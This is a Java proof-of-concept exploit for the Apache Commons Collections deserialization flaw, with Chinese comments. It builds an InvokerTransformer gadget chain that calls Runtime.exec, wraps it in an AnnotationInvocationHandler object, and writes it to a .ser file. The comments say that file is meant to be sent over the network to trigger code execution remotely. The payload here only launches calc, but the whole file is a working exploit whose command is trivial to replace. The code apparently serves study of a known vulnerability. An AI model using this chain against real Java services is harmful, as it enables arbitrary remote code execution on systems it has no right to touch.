package com.cqq;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Main {

    public static void main(String[] args) throws Exception{
        // 构造一个有四个成员的Transformer数组。通过组合一个ConstantTransformer和三个InvokerTransformer构造payload，待构造成ChainedTransformer对象。
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc"})
        };

        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChain
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //得到TransformedMap对象
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);


        /* 本地触发
        //得到AbstractInputCheckedMapDecorator.MapEntry对象

         */
        //Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        //触发漏洞
        //onlyElement.setValue("foobar");

        //return;
        // 构造之后待远程触发
        triggerRemote(outerMap);

    }

    private static void triggerRemote(Map outerMap) throws Exception {
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 获取到AnnotationInvocationHandler的接收class类型和Map类型的构造器
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        // 用于保证反射可调用非Public的属性与方法
        ctor.setAccessible(true);
        // 通过AnnotationInvocationHandler构造器传入outerMap对象，并构造除AnnotationInvocationHandler实例
        Object instance = ctor.newInstance(Target.class, outerMap);

        String serFile = "CommonsCollectionsPoC.ser";
        /* 将恶意的序列化对象写入文件中 待网络传输被反序列化*/
        serialize(instance, serFile);

        /* 模拟反序列化执行任意代码 */
        deSerialize(serFile);
    }


    public static void serialize(Object object, String serFile) throws Exception{
        File f = new File(serFile);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(object);
        out.flush();
        out.close();
    }

    public static void deSerialize(String serFile) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream((serFile)));
        ois.readObject();
        ois.close();
    }
}
